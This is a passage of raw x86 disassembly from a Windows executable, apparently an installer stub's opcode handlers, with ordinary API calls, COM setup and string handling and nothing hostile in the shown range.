  401dd2:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401dd5:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401dda:	50                   	push   %eax
  401ddb:	8b 45 88             	mov    -0x78(%ebp),%eax
  401dde:	0f af 45 d0          	imul   -0x30(%ebp),%eax
  401de2:	50                   	push   %eax
  401de3:	8b 45 84             	mov    -0x7c(%ebp),%eax
  401de6:	0f af 45 cc          	imul   -0x34(%ebp),%eax
  401dea:	50                   	push   %eax
  401deb:	ff 75 f4             	push   -0xc(%ebp)
  401dee:	f7 df                	neg    %edi
  401df0:	ff 75 f8             	push   -0x8(%ebp)
  401df3:	1b ff                	sbb    %edi,%edi
  401df5:	23 3d 40 47 42 00    	and    0x424740,%edi
  401dfb:	57                   	push   %edi
  401dfc:	ff 15 4c 82 40 00    	call   *0x40824c
  401e02:	8b f8                	mov    %eax,%edi
  401e04:	57                   	push   %edi
  401e05:	ff 75 f4             	push   -0xc(%ebp)
  401e08:	68 72 01 00 00       	push   $0x172
  401e0d:	ff 75 08             	push   0x8(%ebp)
  401e10:	ff 15 60 82 40 00    	call   *0x408260
  401e16:	3b c3                	cmp    %ebx,%eax
  401e18:	74 0c                	je     0x401e26
  401e1a:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  401e1d:	75 07                	jne    0x401e26
  401e1f:	50                   	push   %eax
  401e20:	ff 15 60 80 40 00    	call   *0x408060
  401e26:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401e29:	0f 8c 2b 0c 00 00    	jl     0x402a5a
  401e2f:	57                   	push   %edi
  401e30:	e9 34 f7 ff ff       	jmp    0x401569
  401e35:	ff 75 f8             	push   -0x8(%ebp)
  401e38:	ff 15 44 82 40 00    	call   *0x408244
  401e3e:	6a 02                	push   $0x2
  401e40:	8b f8                	mov    %eax,%edi
  401e42:	e8 65 0d 00 00       	call   0x402bac
  401e47:	59                   	pop    %ecx
  401e48:	8b d8                	mov    %eax,%ebx
  401e4a:	6a 48                	push   $0x48
  401e4c:	6a 5a                	push   $0x5a
  401e4e:	57                   	push   %edi
  401e4f:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401e52:	ff 15 54 80 40 00    	call   *0x408054
  401e58:	50                   	push   %eax
  401e59:	53                   	push   %ebx
  401e5a:	ff 15 64 81 40 00    	call   *0x408164
  401e60:	57                   	push   %edi
  401e61:	ff 75 f8             	push   -0x8(%ebp)
  401e64:	f7 d8                	neg    %eax
  401e66:	a3 20 b8 40 00       	mov    %eax,0x40b820
  401e6b:	ff 15 54 82 40 00    	call   *0x408254
  401e71:	6a 03                	push   $0x3
  401e73:	e8 34 0d 00 00       	call   0x402bac
  401e78:	a3 30 b8 40 00       	mov    %eax,0x40b830
  401e7d:	8a 45 e8             	mov    -0x18(%ebp),%al
  401e80:	59                   	pop    %ecx
  401e81:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401e84:	ff 75 dc             	push   -0x24(%ebp)
  401e87:	8a c8                	mov    %al,%cl
  401e89:	80 e1 01             	and    $0x1,%cl
  401e8c:	c6 05 37 b8 40 00 01 	movb   $0x1,0x40b837
  401e93:	88 0d 34 b8 40 00    	mov    %cl,0x40b834
  401e99:	8a c8                	mov    %al,%cl
  401e9b:	80 e1 02             	and    $0x2,%cl
  401e9e:	24 04                	and    $0x4,%al
  401ea0:	68 3c b8 40 00       	push   $0x40b83c
  401ea5:	88 0d 35 b8 40 00    	mov    %cl,0x40b835
  401eab:	a2 36 b8 40 00       	mov    %al,0x40b836
  401eb0:	e8 06 44 00 00       	call   0x4062bb
  401eb5:	68 20 b8 40 00       	push   $0x40b820
  401eba:	ff 15 58 80 40 00    	call   *0x408058
  401ec0:	e9 5b 07 00 00       	jmp    0x402620
  401ec5:	53                   	push   %ebx
  401ec6:	e8 e1 0c 00 00       	call   0x402bac
  401ecb:	6a 01                	push   $0x1
  401ecd:	8b f0                	mov    %eax,%esi
  401ecf:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401ed2:	e8 d5 0c 00 00       	call   0x402bac
  401ed7:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401eda:	59                   	pop    %ecx
  401edb:	59                   	pop    %ecx
  401edc:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401edf:	50                   	push   %eax
  401ee0:	56                   	push   %esi
  401ee1:	75 0b                	jne    0x401eee
  401ee3:	ff 15 30 82 40 00    	call   *0x408230
  401ee9:	e9 6c 0b 00 00       	jmp    0x402a5a
  401eee:	ff 15 58 82 40 00    	call   *0x408258
  401ef4:	e9 61 0b 00 00       	jmp    0x402a5a
  401ef9:	53                   	push   %ebx
  401efa:	e8 cf 0c 00 00       	call   0x402bce
  401eff:	6a 31                	push   $0x31
  401f01:	8b f0                	mov    %eax,%esi
  401f03:	e8 c6 0c 00 00       	call   0x402bce
  401f08:	6a 22                	push   $0x22
  401f0a:	8b d8                	mov    %eax,%ebx
  401f0c:	e8 bd 0c 00 00       	call   0x402bce
  401f11:	6a 15                	push   $0x15
  401f13:	8b f8                	mov    %eax,%edi
  401f15:	e8 b4 0c 00 00       	call   0x402bce
  401f1a:	6a ec                	push   $0xffffffec
  401f1c:	e8 02 f5 ff ff       	call   0x401423
  401f21:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401f24:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401f27:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f2a:	89 45 98             	mov    %eax,-0x68(%ebp)
  401f2d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401f30:	89 45 ac             	mov    %eax,-0x54(%ebp)
  401f33:	8a 06                	mov    (%esi),%al
  401f35:	f6 d8                	neg    %al
  401f37:	1b c0                	sbb    %eax,%eax
  401f39:	89 5d a0             	mov    %ebx,-0x60(%ebp)
  401f3c:	23 c6                	and    %esi,%eax
  401f3e:	89 45 9c             	mov    %eax,-0x64(%ebp)
  401f41:	8a 07                	mov    (%edi),%al
  401f43:	f6 d8                	neg    %al
  401f45:	1b c0                	sbb    %eax,%eax
  401f47:	c7 45 a8 00 a8 42 00 	movl   $0x42a800,-0x58(%ebp)
  401f4e:	23 c7                	and    %edi,%eax
  401f50:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  401f53:	8d 45 90             	lea    -0x70(%ebp),%eax
  401f56:	50                   	push   %eax
  401f57:	e8 ae 39 00 00       	call   0x40590a
  401f5c:	85 c0                	test   %eax,%eax
  401f5e:	0f 84 5b 08 00 00    	je     0x4027bf
  401f64:	f6 45 94 40          	testb  $0x40,-0x6c(%ebp)
  401f68:	0f 84 ec 0a 00 00    	je     0x402a5a
  401f6e:	ff 75 c8             	push   -0x38(%ebp)
  401f71:	e8 30 47 00 00       	call   0x4066a6
  401f76:	ff 75 c8             	push   -0x38(%ebp)
  401f79:	eb 45                	jmp    0x401fc0
  401f7b:	53                   	push   %ebx
  401f7c:	e8 4d 0c 00 00       	call   0x402bce
  401f81:	8b f0                	mov    %eax,%esi
  401f83:	56                   	push   %esi
  401f84:	6a eb                	push   $0xffffffeb
  401f86:	e8 c4 33 00 00       	call   0x40534f
  401f8b:	56                   	push   %esi
  401f8c:	e8 36 39 00 00       	call   0x4058c7
  401f91:	8b f0                	mov    %eax,%esi
  401f93:	3b f3                	cmp    %ebx,%esi
  401f95:	0f 84 24 08 00 00    	je     0x4027bf
  401f9b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401f9e:	74 1f                	je     0x401fbf
  401fa0:	56                   	push   %esi
  401fa1:	e8 00 47 00 00       	call   0x4066a6
  401fa6:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401fa9:	7c 09                	jl     0x401fb4
  401fab:	50                   	push   %eax
  401fac:	57                   	push   %edi
  401fad:	e8 d4 41 00 00       	call   0x406186
  401fb2:	eb 0b                	jmp    0x401fbf
  401fb4:	3b c3                	cmp    %ebx,%eax
  401fb6:	74 07                	je     0x401fbf
  401fb8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401fbf:	56                   	push   %esi
  401fc0:	ff 15 20 81 40 00    	call   *0x408120
  401fc6:	e9 8f 0a 00 00       	jmp    0x402a5a
  401fcb:	6a 02                	push   $0x2
  401fcd:	e8 fc 0b 00 00       	call   0x402bce
  401fd2:	50                   	push   %eax
  401fd3:	e8 c4 45 00 00       	call   0x40659c
  401fd8:	3b c3                	cmp    %ebx,%eax
  401fda:	89 45 08             	mov    %eax,0x8(%ebp)
  401fdd:	74 13                	je     0x401ff2
  401fdf:	8b d8                	mov    %eax,%ebx
  401fe1:	ff 73 14             	push   0x14(%ebx)
  401fe4:	57                   	push   %edi
  401fe5:	e8 9c 41 00 00       	call   0x406186
  401fea:	ff 73 18             	push   0x18(%ebx)
  401fed:	e9 77 f5 ff ff       	jmp    0x401569
  401ff2:	88 1e                	mov    %bl,(%esi)
  401ff4:	88 1f                	mov    %bl,(%edi)
  401ff6:	e9 c4 07 00 00       	jmp    0x4027bf
  401ffb:	6a ee                	push   $0xffffffee
  401ffd:	e8 cc 0b 00 00       	call   0x402bce
  402002:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402005:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402008:	51                   	push   %ecx
  402009:	50                   	push   %eax
  40200a:	6a 0a                	push   $0xa
  40200c:	e8 20 46 00 00       	call   0x406631
  402011:	ff d0                	call   *%eax
  402013:	88 1e                	mov    %bl,(%esi)
  402015:	3b c3                	cmp    %ebx,%eax
  402017:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40201a:	88 1f                	mov    %bl,(%edi)
  40201c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402023:	0f 84 31 0a 00 00    	je     0x402a5a
  402029:	50                   	push   %eax
  40202a:	6a 40                	push   $0x40
  40202c:	ff 15 28 81 40 00    	call   *0x408128
  402032:	3b c3                	cmp    %ebx,%eax
  402034:	89 45 08             	mov    %eax,0x8(%ebp)
  402037:	0f 84 1d 0a 00 00    	je     0x402a5a
  40203d:	6a 0b                	push   $0xb
  40203f:	e8 ed 45 00 00       	call   0x406631
  402044:	6a 0c                	push   $0xc
  402046:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402049:	e8 e3 45 00 00       	call   0x406631
  40204e:	ff 75 08             	push   0x8(%ebp)
  402051:	89 45 8c             	mov    %eax,-0x74(%ebp)
  402054:	ff 75 f4             	push   -0xc(%ebp)
  402057:	53                   	push   %ebx
  402058:	ff 75 cc             	push   -0x34(%ebp)
  40205b:	ff 55 d0             	call   *-0x30(%ebp)
  40205e:	85 c0                	test   %eax,%eax
  402060:	74 32                	je     0x402094
  402062:	8d 45 88             	lea    -0x78(%ebp),%eax
  402065:	50                   	push   %eax
  402066:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402069:	50                   	push   %eax
  40206a:	68 14 a0 40 00       	push   $0x40a014
  40206f:	ff 75 08             	push   0x8(%ebp)
  402072:	ff 55 8c             	call   *-0x74(%ebp)
  402075:	85 c0                	test   %eax,%eax
  402077:	74 1b                	je     0x402094
  402079:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40207c:	ff 70 08             	push   0x8(%eax)
  40207f:	56                   	push   %esi
  402080:	e8 01 41 00 00       	call   0x406186
  402085:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402088:	ff 70 0c             	push   0xc(%eax)
  40208b:	57                   	push   %edi
  40208c:	e8 f5 40 00 00       	call   0x406186
  402091:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402094:	ff 75 08             	push   0x8(%ebp)
  402097:	e9 5a fb ff ff       	jmp    0x401bf6
  40209c:	39 1d 18 48 42 00    	cmp    %ebx,0x424818
  4020a2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4020a9:	0f 8c b5 00 00 00    	jl     0x402164
  4020af:	6a f0                	push   $0xfffffff0
  4020b1:	e8 18 0b 00 00       	call   0x402bce
  4020b6:	6a 01                	push   $0x1
  4020b8:	8b f0                	mov    %eax,%esi
  4020ba:	e8 0f 0b 00 00       	call   0x402bce
  4020bf:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4020c2:	89 45 08             	mov    %eax,0x8(%ebp)
  4020c5:	74 0d                	je     0x4020d4
  4020c7:	56                   	push   %esi
  4020c8:	ff 15 54 81 40 00    	call   *0x408154
  4020ce:	8b f8                	mov    %eax,%edi
  4020d0:	3b fb                	cmp    %ebx,%edi
  4020d2:	75 10                	jne    0x4020e4
  4020d4:	6a 08                	push   $0x8
  4020d6:	53                   	push   %ebx
  4020d7:	56                   	push   %esi
  4020d8:	ff 15 30 81 40 00    	call   *0x408130
  4020de:	8b f8                	mov    %eax,%edi
  4020e0:	3b fb                	cmp    %ebx,%edi
  4020e2:	74 79                	je     0x40215d
  4020e4:	ff 75 08             	push   0x8(%ebp)
  4020e7:	57                   	push   %edi
  4020e8:	e8 b3 45 00 00       	call   0x4066a0
  4020ed:	8b f0                	mov    %eax,%esi
  4020ef:	3b f3                	cmp    %ebx,%esi
  4020f1:	74 3d                	je     0x402130
  4020f3:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4020f6:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020f9:	74 17                	je     0x402112
  4020fb:	ff 75 e0             	push   -0x20(%ebp)
  4020fe:	e8 20 f3 ff ff       	call   0x401423
  402103:	ff d6                	call   *%esi
  402105:	85 c0                	test   %eax,%eax
  402107:	74 31                	je     0x40213a
  402109:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402110:	eb 28                	jmp    0x40213a
  402112:	68 00 a0 40 00       	push   $0x40a000
  402117:	68 60 b8 40 00       	push   $0x40b860
  40211c:	68 00 50 42 00       	push   $0x425000
  402121:	68 00 04 00 00       	push   $0x400
  402126:	ff 75 f8             	push   -0x8(%ebp)
  402129:	ff d6                	call   *%esi
  40212b:	83 c4 14             	add    $0x14,%esp
  40212e:	eb 0a                	jmp    0x40213a
  402130:	ff 75 08             	push   0x8(%ebp)
  402133:	6a f7                	push   $0xfffffff7
  402135:	e8 15 32 00 00       	call   0x40534f
  40213a:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40213d:	0f 85 17 09 00 00    	jne    0x402a5a
  402143:	57                   	push   %edi
  402144:	e8 92 18 00 00       	call   0x4039db
  402149:	85 c0                	test   %eax,%eax
  40214b:	0f 84 09 09 00 00    	je     0x402a5a
  402151:	57                   	push   %edi
  402152:	ff 15 34 81 40 00    	call   *0x408134
  402158:	e9 fd 08 00 00       	jmp    0x402a5a
  40215d:	6a f6                	push   $0xfffffff6
  40215f:	e9 79 01 00 00       	jmp    0x4022dd
  402164:	6a e7                	push   $0xffffffe7
  402166:	e9 72 01 00 00       	jmp    0x4022dd
  40216b:	6a f0                	push   $0xfffffff0
  40216d:	e8 5c 0a 00 00       	call   0x402bce
  402172:	6a df                	push   $0xffffffdf
  402174:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402177:	e8 52 0a 00 00       	call   0x402bce
  40217c:	6a 02                	push   $0x2
  40217e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402181:	e8 48 0a 00 00       	call   0x402bce
  402186:	6a cd                	push   $0xffffffcd
  402188:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  40218e:	e8 3b 0a 00 00       	call   0x402bce
  402193:	6a 45                	push   $0x45
  402195:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402198:	e8 31 0a 00 00       	call   0x402bce
  40219d:	ff 75 f4             	push   -0xc(%ebp)
  4021a0:	89 45 88             	mov    %eax,-0x78(%ebp)
  4021a3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4021a6:	8b c8                	mov    %eax,%ecx
  4021a8:	8b f8                	mov    %eax,%edi
  4021aa:	8b f0                	mov    %eax,%esi
  4021ac:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  4021b2:	c1 f8 10             	sar    $0x10,%eax
  4021b5:	c1 fe 0c             	sar    $0xc,%esi
  4021b8:	25 ff ff 00 00       	and    $0xffff,%eax
  4021bd:	89 8d 70 ff ff ff    	mov    %ecx,-0x90(%ebp)
  4021c3:	81 e7 00 80 00 00    	and    $0x8000,%edi
  4021c9:	83 e6 07             	and    $0x7,%esi
  4021cc:	89 45 8c             	mov    %eax,-0x74(%ebp)
  4021cf:	e8 59 3a 00 00       	call   0x405c2d
  4021d4:	85 c0                	test   %eax,%eax
  4021d6:	75 07                	jne    0x4021df
  4021d8:	6a 21                	push   $0x21
  4021da:	e8 ef 09 00 00       	call   0x402bce
  4021df:	8d 45 08             	lea    0x8(%ebp),%eax
  4021e2:	50                   	push   %eax
  4021e3:	68 08 84 40 00       	push   $0x408408
  4021e8:	6a 01                	push   $0x1
  4021ea:	53                   	push   %ebx
  4021eb:	68 18 84 40 00       	push   $0x408418
  4021f0:	ff 15 90 82 40 00    	call   *0x408290
  4021f6:	3b c3                	cmp    %ebx,%eax
  4021f8:	0f 8c d6 00 00 00    	jl     0x4022d4
  4021fe:	8b 45 08             	mov    0x8(%ebp),%eax
  402201:	8d 55 d0             	lea    -0x30(%ebp),%edx
  402204:	52                   	push   %edx
  402205:	68 28 84 40 00       	push   $0x408428
  40220a:	8b 08                	mov    (%eax),%ecx
  40220c:	50                   	push   %eax
  40220d:	ff 11                	call   *(%ecx)
  40220f:	3b c3                	cmp    %ebx,%eax
  402211:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402214:	0f 8c ac 00 00 00    	jl     0x4022c6
  40221a:	8b 45 08             	mov    0x8(%ebp),%eax
  40221d:	ff 75 f4             	push   -0xc(%ebp)
  402220:	8b 08                	mov    (%eax),%ecx
  402222:	50                   	push   %eax
  402223:	ff 51 50             	call   *0x50(%ecx)
  402226:	3b fb                	cmp    %ebx,%edi
  402228:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40222b:	75 0e                	jne    0x40223b
  40222d:	8b 45 08             	mov    0x8(%ebp),%eax
  402230:	68 00 a8 42 00       	push   $0x42a800
  402235:	50                   	push   %eax
  402236:	8b 08                	mov    (%eax),%ecx
  402238:	ff 51 24             	call   *0x24(%ecx)
  40223b:	3b f3                	cmp    %ebx,%esi
  40223d:	74 0a                	je     0x402249
  40223f:	8b 45 08             	mov    0x8(%ebp),%eax
  402242:	56                   	push   %esi
  402243:	50                   	push   %eax
  402244:	8b 08                	mov    (%eax),%ecx
  402246:	ff 51 3c             	call   *0x3c(%ecx)
  402249:	8b 45 08             	mov    0x8(%ebp),%eax
  40224c:	ff 75 8c             	push   -0x74(%ebp)
  40224f:	8b 08                	mov    (%eax),%ecx
  402251:	50                   	push   %eax
  402252:	ff 51 34             	call   *0x34(%ecx)
  402255:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  402258:	38 19                	cmp    %bl,(%ecx)
  40225a:	74 10                	je     0x40226c
  40225c:	8b 45 08             	mov    0x8(%ebp),%eax
  40225f:	ff b5 70 ff ff ff    	push   -0x90(%ebp)
  402265:	8b 10                	mov    (%eax),%edx
  402267:	51                   	push   %ecx
  402268:	50                   	push   %eax
  402269:	ff 52 44             	call   *0x44(%edx)
  40226c:	8b 45 08             	mov    0x8(%ebp),%eax
  40226f:	ff b5 78 ff ff ff    	push   -0x88(%ebp)
  402275:	8b 08                	mov    (%eax),%ecx
  402277:	50                   	push   %eax
  402278:	ff 51 2c             	call   *0x2c(%ecx)
  40227b:	8b 45 08             	mov    0x8(%ebp),%eax
  40227e:	ff 75 88             	push   -0x78(%ebp)
  402281:	8b 08                	mov    (%eax),%ecx
  402283:	50                   	push   %eax
  402284:	ff 51 1c             	call   *0x1c(%ecx)
  402287:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40228a:	7c 31                	jl     0x4022bd
  40228c:	68 00 04 00 00       	push   $0x400
  402291:	c7 45 f8 05 40 00 80 	movl   $0x80004005,-0x8(%ebp)
  402298:	ff 75 f4             	push   -0xc(%ebp)
  40229b:	6a ff                	push   $0xffffffff
  40229d:	ff 75 c8             	push   -0x38(%ebp)
  4022a0:	53                   	push   %ebx
  4022a1:	53                   	push   %ebx
  4022a2:	ff 15 44 81 40 00    	call   *0x408144
  4022a8:	85 c0                	test   %eax,%eax
  4022aa:	74 11                	je     0x4022bd
  4022ac:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4022af:	6a 01                	push   $0x1
  4022b1:	ff 75 f4             	push   -0xc(%ebp)
  4022b4:	8b 08                	mov    (%eax),%ecx
  4022b6:	50                   	push   %eax
  4022b7:	ff 51 18             	call   *0x18(%ecx)
  4022ba:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4022bd:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4022c0:	50                   	push   %eax
  4022c1:	8b 08                	mov    (%eax),%ecx
  4022c3:	ff 51 08             	call   *0x8(%ecx)
  4022c6:	8b 45 08             	mov    0x8(%ebp),%eax
  4022c9:	50                   	push   %eax
  4022ca:	8b 08                	mov    (%eax),%ecx
  4022cc:	ff 51 08             	call   *0x8(%ecx)
  4022cf:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4022d2:	7d 13                	jge    0x4022e7
  4022d4:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4022db:	6a f0                	push   $0xfffffff0
  4022dd:	e8 41 f1 ff ff       	call   0x401423
  4022e2:	e9 73 07 00 00       	jmp    0x402a5a
  4022e7:	6a f4                	push   $0xfffffff4
  4022e9:	eb f2                	jmp    0x4022dd
  4022eb:	53                   	push   %ebx
  4022ec:	e8 dd 08 00 00       	call   0x402bce
  4022f1:	6a 11                	push   $0x11
  4022f3:	8b f0                	mov    %eax,%esi
  4022f5:	e8 d4 08 00 00       	call   0x402bce
  4022fa:	6a 23                	push   $0x23
  4022fc:	8b f8                	mov    %eax,%edi
  4022fe:	e8 cb 08 00 00       	call   0x402bce
  402303:	56                   	push   %esi
  402304:	89 45 08             	mov    %eax,0x8(%ebp)
  402307:	e8 90 42 00 00       	call   0x40659c
  40230c:	85 c0                	test   %eax,%eax
  40230e:	75 0d                	jne    0x40231d
  402310:	53                   	push   %ebx
  402311:	6a f9                	push   $0xfffffff9
  402313:	e8 37 30 00 00       	call   0x40534f
  402318:	e9 a2 04 00 00       	jmp    0x4027bf
  40231d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402320:	56                   	push   %esi
  402321:	89 45 ac             	mov    %eax,-0x54(%ebp)
  402324:	c7 45 b0 02 00 00 00 	movl   $0x2,-0x50(%ebp)
  40232b:	e8 0e 3f 00 00       	call   0x40623e
  402330:	57                   	push   %edi
  402331:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  402335:	e8 04 3f 00 00       	call   0x40623e
  40233a:	88 5c 38 01          	mov    %bl,0x1(%eax,%edi,1)
  40233e:	8b 45 08             	mov    0x8(%ebp),%eax
  402341:	66 8b 4d e0          	mov    -0x20(%ebp),%cx
  402345:	50                   	push   %eax
  402346:	53                   	push   %ebx
  402347:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  40234a:	89 7d b8             	mov    %edi,-0x48(%ebp)
  40234d:	89 45 c6             	mov    %eax,-0x3a(%ebp)
  402350:	66 89 4d bc          	mov    %cx,-0x44(%ebp)
  402354:	e8 f6 2f 00 00       	call   0x40534f
  402359:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40235c:	50                   	push   %eax
  40235d:	ff 15 70 81 40 00    	call   *0x408170
  402363:	85 c0                	test   %eax,%eax
  402365:	0f 84 ef 06 00 00    	je     0x402a5a
  40236b:	eb a3                	jmp    0x402310
  40236d:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  402372:	74 1d                	je     0x402391
  402374:	68 10 00 20 00       	push   $0x200010
  402379:	6a e8                	push   $0xffffffe8
  40237b:	53                   	push   %ebx
  40237c:	e8 3a 3f 00 00       	call   0x4062bb
  402381:	50                   	push   %eax
  402382:	e8 bd 35 00 00       	call   0x405944
  402387:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40238c:	e9 d4 06 00 00       	jmp    0x402a65
  402391:	ff 05 f4 47 42 00    	incl   0x4247f4
  402397:	e9 be 06 00 00       	jmp    0x402a5a
  40239c:	33 f6                	xor    %esi,%esi
  40239e:	33 ff                	xor    %edi,%edi
  4023a0:	3b c3                	cmp    %ebx,%eax
  4023a2:	74 0b                	je     0x4023af
  4023a4:	53                   	push   %ebx
  4023a5:	e8 24 08 00 00       	call   0x402bce
  4023aa:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4023ad:	8b f0                	mov    %eax,%esi
  4023af:	3b d3                	cmp    %ebx,%edx
  4023b1:	74 09                	je     0x4023bc
  4023b3:	6a 11                	push   $0x11
  4023b5:	e8 14 08 00 00       	call   0x402bce
  4023ba:	8b f8                	mov    %eax,%edi
  4023bc:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4023bf:	74 09                	je     0x4023ca
  4023c1:	6a 22                	push   $0x22
  4023c3:	e8 06 08 00 00       	call   0x402bce
  4023c8:	8b d8                	mov    %eax,%ebx
  4023ca:	6a cd                	push   $0xffffffcd
  4023cc:	e8 fd 07 00 00       	call   0x402bce
  4023d1:	50                   	push   %eax
  4023d2:	53                   	push   %ebx
  4023d3:	57                   	push   %edi
  4023d4:	56                   	push   %esi
  4023d5:	ff 15 48 81 40 00    	call   *0x408148
  4023db:	e9 ce f1 ff ff       	jmp    0x4015ae
  4023e0:	66 a1 10 a0 40 00    	mov    0x40a010,%ax
  4023e6:	6a 01                	push   $0x1
  4023e8:	66 89 45 0a          	mov    %ax,0xa(%ebp)
  4023ec:	e8 dd 07 00 00       	call   0x402bce
  4023f1:	6a 12                	push   $0x12
  4023f3:	8b f8                	mov    %eax,%edi
  4023f5:	e8 d4 07 00 00       	call   0x402bce
  4023fa:	6a dd                	push   $0xffffffdd
  4023fc:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4023ff:	e8 ca 07 00 00       	call   0x402bce
  402404:	50                   	push   %eax
  402405:	68 ff 03 00 00       	push   $0x3ff
  40240a:	8d 45 0a             	lea    0xa(%ebp),%eax
  40240d:	56                   	push   %esi
  40240e:	50                   	push   %eax
  40240f:	ff 75 c8             	push   -0x38(%ebp)
  402412:	57                   	push   %edi
  402413:	ff 15 4c 81 40 00    	call   *0x40814c
  402419:	80 3e 0a             	cmpb   $0xa,(%esi)
  40241c:	e9 1a f3 ff ff       	jmp    0x40173b
  402421:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402424:	8b f2                	mov    %edx,%esi
  402426:	75 2b                	jne    0x402453
  402428:	6a 02                	push   $0x2
  40242a:	e8 df 07 00 00       	call   0x402c0e
  40242f:	8b f0                	mov    %eax,%esi
  402431:	3b f3                	cmp    %ebx,%esi
  402433:	0f 84 86 03 00 00    	je     0x4027bf
  402439:	6a 33                	push   $0x33
  40243b:	e8 8e 07 00 00       	call   0x402bce
  402440:	50                   	push   %eax
  402441:	56                   	push   %esi
  402442:	ff 15 14 80 40 00    	call   *0x408014
  402448:	56                   	push   %esi
  402449:	8b f8                	mov    %eax,%edi
  40244b:	ff 15 10 80 40 00    	call   *0x408010
  402451:	eb 16                	jmp    0x402469
  402453:	6a 22                	push   $0x22
  402455:	e8 74 07 00 00       	call   0x402bce
  40245a:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40245d:	d1 f9                	sar    $1,%ecx
  40245f:	51                   	push   %ecx
  402460:	50                   	push   %eax
  402461:	56                   	push   %esi
  402462:	e8 25 08 00 00       	call   0x402c8c
  402467:	8b f8                	mov    %eax,%edi
  402469:	3b fb                	cmp    %ebx,%edi
  40246b:	0f 84 e9 05 00 00    	je     0x402a5a
  402471:	e9 49 03 00 00       	jmp    0x4027bf
  402476:	8b 75 e8             	mov    -0x18(%ebp),%esi
  402479:	8b f8                	mov    %eax,%edi
  40247b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40247e:	6a 02                	push   $0x2
  402480:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402483:	e8 46 07 00 00       	call   0x402bce
  402488:	6a 11                	push   $0x11
  40248a:	89 45 88             	mov    %eax,-0x78(%ebp)
  40248d:	e8 3c 07 00 00       	call   0x402bce
  402492:	6a 02                	push   $0x2
  402494:	50                   	push   %eax
  402495:	57                   	push   %edi
  402496:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40249d:	e8 bc 07 00 00       	call   0x402c5e
  4024a2:	3b c3                	cmp    %ebx,%eax
  4024a4:	89 45 08             	mov    %eax,0x8(%ebp)
  4024a7:	0f 84 ad 05 00 00    	je     0x402a5a
  4024ad:	33 c0                	xor    %eax,%eax
  4024af:	83 fe 01             	cmp    $0x1,%esi
  4024b2:	bf 20 ac 40 00       	mov    $0x40ac20,%edi
  4024b7:	75 0e                	jne    0x4024c7
  4024b9:	6a 23                	push   $0x23
  4024bb:	e8 0e 07 00 00       	call   0x402bce
  4024c0:	57                   	push   %edi
  4024c1:	e8 78 3d 00 00       	call   0x40623e
  4024c6:	40                   	inc    %eax
  4024c7:	83 fe 04             	cmp    $0x4,%esi
  4024ca:	75 15                	jne    0x4024e1
  4024cc:	6a 03                	push   $0x3
  4024ce:	e8 d9 06 00 00       	call   0x402bac
  4024d3:	59                   	pop    %ecx
  4024d4:	a3 20 ac 40 00       	mov    %eax,0x40ac20
  4024d9:	56                   	push   %esi
  4024da:	89 95 78 ff ff ff    	mov    %edx,-0x88(%ebp)
  4024e0:	58                   	pop    %eax
  4024e1:	83 fe 03             	cmp    $0x3,%esi
  4024e4:	75 0f                	jne    0x4024f5
  4024e6:	68 00 0c 00 00       	push   $0xc00
  4024eb:	57                   	push   %edi
  4024ec:	53                   	push   %ebx
